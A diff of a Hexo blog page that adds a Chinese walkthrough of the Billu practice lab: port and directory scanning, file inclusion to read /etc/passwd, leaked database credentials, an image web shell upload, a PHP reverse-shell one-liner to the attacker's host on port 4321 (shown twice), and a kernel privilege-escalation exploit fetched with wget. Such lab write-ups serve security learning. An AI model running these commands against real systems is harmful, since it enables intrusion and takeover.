@@ -85,7 +85,7 @@
 
       <div class="outer">
         <section id="main">
-  <article id="post-Billu靶场渗透测试" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <article id="post-Billu渗透测试" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner">
     
     
@@ -93,7 +93,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/11/14/Billu%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">Billu靶场渗透测试</a>
+      <a class="p-name article-title" href="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">Billu渗透测试</a>
     </h1>
   
 
@@ -104,12 +104,12 @@
       
       <span class="article-date">
   <i class="fa fa-date"></i>
-  <time class="dt-published" datetime="2023-11-14T02:22:16.048Z" itemprop="datePublished">2023年11月14日</time>
+  <time class="dt-published" datetime="2023-11-14T03:15:47.000Z" itemprop="datePublished">2023年11月14日</time>
 </span>
       
       
       
-<a href="/2023/11/14/Billu%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#comments" class="article-comment-link">
+<a href="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#comments" class="article-comment-link">
   
   <i class="fa fa-commt"></i>
   留言
@@ -119,16 +119,128 @@
     </div>
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h1 id="Billu靶场渗透测试"><a href="#Billu靶场渗透测试" class="headerlink" title="Billu靶场渗透测试"></a>Billu靶场渗透测试</h1>
+        <h1 id="Billu靶场渗透测试"><a href="#Billu靶场渗透测试" class="headerlink" title="Billu靶场渗透测试"></a>Billu靶场渗透测试</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>查看存活主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231107153336611.png" alt="image-20231107153336611"></p>
+<p>查看IP开放端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV 192.168.43.140 -p-</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231107153554178.png" alt="image-20231107153554178"></p>
+<p>发现开放了22和80端口。</p>
+<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>开始访问网页：</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231107153714160.png" alt="image-20231107153714160"></p>
+<p>使用万能钥匙admin’ and ‘1’ &#x3D; ‘1</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231107154242343.png" alt="image-20231107154242343"></p>
+<p>不行，思考，扫描目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.43.140/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231107154437211.png" alt="image-20231107154437211"></p>
+<p>显示200的有几个，尝试访问一下这几个路径：</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231107154746765.png" alt="image-20231107154746765"></p>
+<p>在in目录下发现php版本，并且allow_url_fopen的值为On，疑似文件包含。</p>
+<p>尝试几个路径之后发现：</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231107155154685.png" alt="image-20231107155154685"></p>
+<p>将file拼接到后面：</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231107155346329.png" alt="image-20231107155346329"></p>
+<p>发现没有反应，可能是get传参不行，改用post</p>
+<p>使用bp抓包，更改请求方式为post：</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231107155531615.png" alt="image-20231107155531615"></p>
+<p>包含成功！</p>
+<p>从上面可以发现，后端是Linux操作系统，所以查看&#x2F;etc&#x2F;passwd。</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231107155824776.png" alt="image-20231107155824776"></p>
+<p>查看其他路径文件：</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231107210933945.png" alt="image-20231107210933945"></p>
+<p>发现panel.php内部包含了一个c.php文件：</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231107203146743.png" alt="image-20231107203146743"></p>
+<p>在c.php文件中发现疑似连接数据库的用户名密码。</p>
+<p>访问phpmy的时候发现是一个phpmyadmin的数据库登陆页面，尝试使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">账户：billu 密码：b0x_billu   登录成功。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231107203858425.png" alt="image-20231107203858425"></p>
+<p>在数据库中发现了c.php页面回显的库名，点击auth表中，找到一个uname和pass，疑似页面登陆密码</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231107204141552.png" alt="image-20231107204141552"></p>
+<p>尝试登陆：</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231107204351212.png" alt="image-20231107204351212"></p>
+<p>登陆成功。</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231107204615683.png" alt="image-20231107204615683"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>查看panel.php时，发现一个白名单：</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231107211301319.png" alt="image-20231107211301319"></p>
+<p>可以上传一个图片，准备一个一句话木马图片，命名为hack.jpg</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231108143814121.png" alt="image-20231108143814121"></p>
+<p>尝试上传：</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231107205010054.png" alt="image-20231107205010054"></p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231107205023850.png" alt="image-20231107205023850"></p>
+<p>上传成功。</p>
+<p>查看panel.php发现上传图片的路径在uploaded.images</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231107211619216.png" alt="image-20231107211619216"></p>
+<p>访问查看：</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231107211738126.png" alt="image-20231107211738126"></p>
+<p>上传成功。</p>
+<p>想到panel.php中有一个是post传参，</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231107211130532.png" alt="image-20231107211130532"></p>
+<p>点击continue，抓包：</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231107205734738.png" alt="image-20231107205734738"></p>
+<p>发现POST传参的参数就是load，尝试更改load的值,顺便查看用户名：</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231108143911866.png" alt="image-20231108143911866"></p>
+<p>bp提交此段代码使用kali监听：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.43.129&quot;,4321);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这里，在bp当中需要使用url编码特殊字符</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231108190422648.png" alt="image-20231108190422648"></p>
+<p>发送之前使用kali监听4321端口，然后查看是否成功反弹shell</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231108190546764.png" alt="image-20231108190546764"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>提权的提前准备工作：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先需要知道一个能写入的目录</span><br></pre></td></tr></table></figure>
+
+<p>uploaded_images&#x2F;就能上传文件，所以他能写入</p>
+<p>查看系统内核，命令uanme -a和cat &#x2F;etc&#x2F;issue</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231108192624799.png" alt="image-20231108192624799"></p>
+<p>查看系统漏洞</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231108192652515.png" alt="image-20231108192652515"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux 3.13.0</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231108193128428.png" alt="image-20231108193128428"></p>
+<p>将37292.c文件拷贝到网页根目录</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231108193551655.png" alt="image-20231108193551655"></p>
+<p>开启apache服务：</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231108193831466.png" alt="image-20231108193831466"></p>
+<p>使用反弹的shell下载到tmp目录下：</p>
+<p>回到 shell，因为权限不够，所以切换到临时目录，使用 wget 下载</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231108193954150.png" alt="image-20231108193954150"></p>
+<p>编译执行</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231108194129014.png" alt="image-20231108194129014"></p>
+<p>将37292.c文件转换为可执行文件lcx，然后执行lcx</p>
+<p><img src="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20231108194245989.png" alt="image-20231108194245989"></p>
+<p>提权成功！</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​		通过这次试验，深度理解了文件包含的方式，但收获最大的还是反弹shell的过程。在上传木马图片之后，使用了很多种反弹shell的方法，最后使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.43.129&quot;,4321);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>一段php代码完成了shell的反弹，值得注意的是需要对其进行特殊字符url编码。反弹shell的方式有很多，目前感觉是内核提权的一道门槛。所以我还需要不断地加强联系呀！！！除此之外，还有就是了解到有些题目规定使用post还是get，上传的木马文件或者图片就需要特别注意了，是post呢还是get，还需要根据情况而定，@eval没有回显，system（）有回显，提交所谓的密码cmd也可当作是一个提交参数，平时只知道用，不清楚到底还能表达什么。总之，还需不断积累。</p>
+
+        
+        
+          <blockquote id="copyright">
+              <p>原文链接: <a href="http://example.com/index.html">http://example.com/index.html</a></p>
+              <p>版权声明: 转载请注明出处.</p>
+          </blockquote>
+        
       
     </div>
     <footer class="article-footer">
       
-        
-        <p class="article-more-link">
-          <a href="/2023/11/14/Billu%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#more">Read More</a>
-        </p>
+        <div class="article-tag-wrap">
+          
+
+          
+          
+    <div class="social-share">
+      <span>分享到:</span>
+    </div>
+
+
+
+        </div>
       
       
       
@@ -137,7 +249,7 @@
 </article>
 
 
-  <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <article id="post-test" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner">
     
     
@@ -145,7 +257,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/11/08/hello-world/">Hello World</a>
+      <a class="p-name article-title" href="/2023/11/14/test/">test</a>
     </h1>
   
 
@@ -156,12 +268,12 @@
       
       <span class="article-date">
   <i class="fa fa-date"></i>
-  <time class="dt-published" datetime="2023-11-08T12:59:27.543Z" itemprop="datePublished">2023年11月08日</time>
+  <time class="dt-published" datetime="2023-11-14T02:58:59.000Z" itemprop="datePublished">2023年11月14日</time>
 </span>
       
       
       
-<a href="/2023/11/08/hello-world/#comments" class="article-comment-link">
+<a href="/2023/11/14/test/#comments" class="article-comment-link">
   
   <i class="fa fa-commt"></i>
   留言
@@ -171,18 +283,31 @@
     </div>
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+        <p><img src="/2023/11/14/test/2.png" alt="2"></p>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+        
+        
+          <blockquote id="copyright">
+              <p>原文链接: <a href="http://example.com/index.html">http://example.com/index.html</a></p>
+              <p>版权声明: 转载请注明出处.</p>
+          </blockquote>
+        
       
     </div>
     <footer class="article-footer">
       
-        
-        <p class="article-more-link">
-          <a href="/2023/11/08/hello-world/#more">Read More</a>
-        </p>
+        <div class="article-tag-wrap">
+          
+
+          
+          
+    <div class="social-share">
+      <span>分享到:</span>
+    </div>
+
+
+
+        </div>
       
       
       
@@ -203,11 +328,11 @@
       <ul>
         
           <li>
-            <a href="/2023/11/14/Billu%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">Billu靶场渗透测试</a>
+            <a href="/2023/11/14/Billu%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">Billu渗透测试</a>
           </li>
         
           <li>
-            <a href="/2023/11/08/hello-world/">Hello World</a>
+            <a href="/2023/11/14/test/">test</a>
           </li>
         
       </ul>
